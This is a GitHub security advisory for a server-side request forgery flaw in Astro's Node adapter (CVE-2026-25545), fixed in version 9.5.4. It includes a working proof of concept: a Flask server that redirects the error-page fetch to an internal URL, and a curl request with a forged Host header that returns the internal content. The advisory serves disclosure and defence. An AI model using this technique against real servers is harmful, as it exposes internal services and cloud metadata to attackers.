# [M] Astro has Full-Read SSRF in error rendering via Host: header injection

## Summary
Severity: Medium
Advisory: GHSA-qq67-mvv5-fw3g
CVE: CVE-2026-25545
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-02-23
Source: https://github.com/advisories/GHSA-qq67-mvv5-fw3g
Type: github-advisory

## Affected
- npm: `@astrojs/node` — affected >=0 <9.5.4

## Details
### Summary

Server-Side Rendered pages that return an error with a prerendered custom error page (eg. `404.astro` or `500.astro`) are vulnerable to SSRF. If the `Host:` header is changed to an attacker's server, it will be fetched on `/500.html` and they can redirect this to any internal URL to read the response body through the first request.

### Details

The following line of code fetches `statusURL` and returns the response back to the client:

https://github.com/withastro/astro/blob/bf0b4bfc7439ddc565f61a62037880e4e701eb05/packages/astro/src/core/app/base.ts#L534

`statusURL` comes from `this.baseWithoutTrailingSlash`, which [is built from the `Host:` header](https://github.com/withastro/astro/blob/e5e3208ee5041ad9cccd479c29a34bf6183a6505/packages/astro/src/core/app/node.ts#L81). `prerenderedErrorPageFetch()` is just `fetch()`, and **follows redirects**. This makes it possible for an attacker to set the `Host:` header to their server (eg. `Host: attacker.tld`), and if the server still receives the request without normalization, Astro will now fetch `http://attacker.tld/500.html`.

The attacker can then redirect this request to http://localhost:8000/ssrf.txt, for example, to fetch any locally listening service. The response code is not checked, because as the comment in the code explains, this fetch may give a 200 OK. The body and headers are returned back to the attacker.

Looking at the vulnerable code, the way to reach this is if the `renderError()` function is called (error response during SSR) and the error page is prerendered (custom `500.astro` error page). The PoC below shows how a basic project with these requirements can be set up.

**Note**: Another common vulnerable pattern for `404.astro` we saw is:

```astro
return new Response(null, {status: 404});
```

Also, it does not matter what `allowedDomains` is set to, since it only checks the `X-Forwarded-Host:` header.

https://github.com/withastro/astro/blob/9e16d63cdd2537c406e50d005b389ac115755e8e/packages/astro/src/core/app/base.ts#L146

### PoC

1. Create a new empty project

```bash
npm create astro@latest poc -- --template minimal --install --no-git --yes
```

2. Create `poc/src/pages/error.astro` which throws an error with SSR:

```astro
---
export const prerender = false;

throw new Error("Test")
---
```

3. Create `poc/src/pages/500.astro` with any content like:

```astro
<p>500 Internal Server Error</p>
```

4. Build and run the app

```bash
cd poc
npx astro add node --yes
npm run build && npm run preview
```

5. Set up an "internal server" which we will SSRF to. Create a file called `ssrf.txt` and host it locally on http://localhost:8000:

```bash
cd $(mktemp -d)
echo "SECRET CONTENT" > ssrf.txt
python3 -m http.server
```

6. Set up attacker's server with exploit code and run it, so that its server becomes available on http://localhost:5000:

```python
# pip install Flask
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/500.html")
def exploit():
    return redirect("http://127.0.0.1:8000/ssrf.txt")

if __name__ == "__main__":
    app.run()
```

7. Send the following request to the server, and notice the 500 error returns "SECRET CONTENT".

```shell
$ curl -i http://localhost:4321/error -H 'Host: localhost:5000'
HTTP/1.1 500 OK
content-type: text/plain
date: Tue, 03 Feb 2026 09:51:28 GMT
last-modified: Tue, 03 Feb 2026 09:51:09 GMT
server: SimpleHTTP/0.6 Python/3.12.3
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

SECRET CONTENT
```

### Impact

An attacker who can access the application without `Host:` header validation (eg. through finding the origin IP behind a proxy, or just by default) can fetch their own server to redirect to any internal IP. With this they can fetch cloud metadata IPs and interact with services in the internal network or localhost.

For this to be vulnerable, [a common feature](https://docs.astro.build/en/basics/astro-pages/#custom-500-error-page) needs to be used, with direct access to the server (no proxies).

## References
- https://github.com/withastro/astro/security/advisories/GHSA-qq67-mvv5-fw3g
- https://nvd.nist.gov/vuln/detail/CVE-2026-25545
- https://github.com/withastro/astro/commit/e01e98b063e90d274c42130ec2a60cc0966622c9
- https://docs.astro.build/en/basics/astro-pages/#custom-500-error-page
- https://github.com/withastro/astro
- https://github.com/withastro/astro/releases/tag/%40astrojs%2Fnode%409.5.4
